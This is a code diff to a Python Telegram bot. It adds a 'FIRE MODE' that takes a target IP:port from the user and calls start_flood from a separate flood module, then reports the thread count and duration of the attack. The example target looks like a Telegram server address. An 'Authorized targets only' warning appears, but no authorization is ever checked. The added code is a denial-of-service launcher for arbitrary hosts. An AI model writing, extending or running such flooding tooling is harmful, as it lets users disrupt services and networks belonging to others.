@@ -252,6 +252,9 @@ async def h_callback(event):
     elif data == "menu:vc":
         WAIT[uid] = "vc"
         await event.edit("🔍 <b>Send group link, @username, or chat ID.</b>", parse_mode="html")
+    elif data == "menu:fire":
+        WAIT[uid] = "fire_ip"
+        await event.edit("🔥 <b>FIRE MODE</b>\n\nSend target <code>IP:port</code> (e.g. <code>91.108.17.19:32003</code>).\n\n⚠️ Authorized targets only.", parse_mode="html")
     elif data == "menu:me":
         me = await user_client.get_me()
         await event.edit("👤 <b>My Account</b>\n\nName: <b>" + html.escape(me.first_name or "") + "</b>\nID: <code>" + str(me.id) + "</code>\nPhone: <code>+" + str(me.phone) + "</code>", buttons=[[cb("⬅️ Back", b"menu:main", "danger")]], parse_mode="html")
@@ -367,6 +370,21 @@ async def h_text(event):
         return
     if uid not in approved and uid not in OWNER_IDS:
         return await event.respond("⛔ Access denied. Send /start to request access.")
+    if WAIT.get(uid) == "fire_ip":
+        WAIT.pop(uid, None)
+        if ":" not in text:
+            return await event.respond("❌ Format: <code>IP:port</code>", parse_mode="html")
+        ip, port = text.rsplit(":", 1)
+        ip = ip.strip().strip("[]")
+        if not port.strip().isdigit():
+            return await event.respond("❌ Port numeric hona chahiye.", parse_mode="html")
+        from flood import start_flood
+        info = start_flood(ip, int(port.strip()))
+        return await event.respond(
+            "🔥 Flood started\n\nTarget: <code>" + html.escape(ip) + ":" + port.strip() + "</code>\n"
+            "Threads: " + str(info["threads"]) + "\n"
+            "Duration: " + str(info["duration"]) + "s\n\n"
+            "⚠️ Authorized targets only.", parse_mode="html")
     if WAIT.get(uid) == "vc" or validate_target(text):
         target = validate_target(text) or text
         cd = check_cooldown(uid)
